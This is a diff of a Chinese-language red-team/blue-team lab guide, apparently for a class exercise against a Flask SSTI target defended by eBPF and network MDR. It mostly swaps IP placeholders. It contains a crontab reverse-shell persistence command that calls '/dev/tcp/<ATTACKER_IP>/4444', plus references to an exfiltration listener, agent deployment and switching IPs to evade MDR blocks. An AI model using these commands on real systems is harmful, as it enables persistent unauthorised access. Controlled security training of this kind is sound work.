@@ -4,7 +4,7 @@
 
 | 角色 | 位置 | 說明 |
 |------|------|------|
-| 紅軍攻擊機 | 同學筆電 (WSL2) | 攻擊發起端 |
+| 紅軍攻擊機 | 攻擊機 (Ubuntu 24.04) | 攻擊發起端 |
 | 企業靶機 | Lab 機器 | Flask SSTI 漏洞服務 + SSH 蜜罐 |
 | 藍軍防禦中心 | Lab 機器 | eBPF MDR + 網路 MDR + SOC Dashboard |
 
@@ -97,8 +97,8 @@ C2> ls -la /home/
 > 注意：以下指令在 C2 shell 中執行（靶機上）
 
 ```bash
-# 植入 crontab 反向 shell (替換 <WSL2_IP>)
-(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/<WSL2_IP>/4444 0>&1'") | crontab -
+# 植入 crontab 反向 shell (替換 <ATTACKER_IP>)
+(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'") | crontab -
 ```
 
 ### Phase 5: Evasion — eBPF v1 Bypass (繞過防禦)
@@ -140,7 +140,7 @@ sudo .venv/bin/python3 red_team/exfil_listener.py
 
 # 靶機 (C2 shell 或 reverse shell 內): 部署 agent
 # 先在攻擊機生成部署指令:
-bash red_team/deploy_agent.sh <WSL2_IP>
+bash red_team/deploy_agent.sh <ATTACKER_IP>
 # 然後將輸出貼到 shell 中執行
 ```
 
@@ -162,8 +162,8 @@ exit
 
 | IP | 用途 | 結果 |
 |----|------|------|
-| 172.22.137.14 (主) | 觸發蜜罐 port 2222 | 被 MDR 封鎖 |
-| 172.22.137.15 (備用) | 攻擊 port 9999 | 未被封鎖 |
+| 192.168.1.14 (主) | 觸發蜜罐 port 2222 | 被 MDR 封鎖 |
+| 192.168.1.15 (備用) | 攻擊 port 9999 | 未被封鎖 |
 
 管理指令: `bash red_team/ip_switch.sh add` / `remove` / `status`
 
@@ -216,7 +216,7 @@ Privilege Escalation 和 Impact 我們沒有做，主要是控制演練的影響
 ## 備忘
 
 1. **Port 2222 是蜜罐** — 碰了會被 MDR 封 IP，Demo 的時候先用主 IP 觸發，再用 `ip_switch.sh` 切備用 IP
-2. **記得換 IP** — 用之前把 `<TARGET_IP>` 和 `<ATTACKER_IP>` / `<WSL2_IP>` 換成實際的 IP
+2. **記得換 IP** — 用之前把 `<TARGET_IP>` 和 `<ATTACKER_IP>` 換成實際的 IP
 3. **venv 環境** — Python 工具都用 `.venv/bin/python3` 跑，需要 sudo 的就 `sudo .venv/bin/python3`
 4. **純 CLI** — 演練全程不用 GUI 工具
 5. **不做提權和破壞** — 控制影響範圍就好
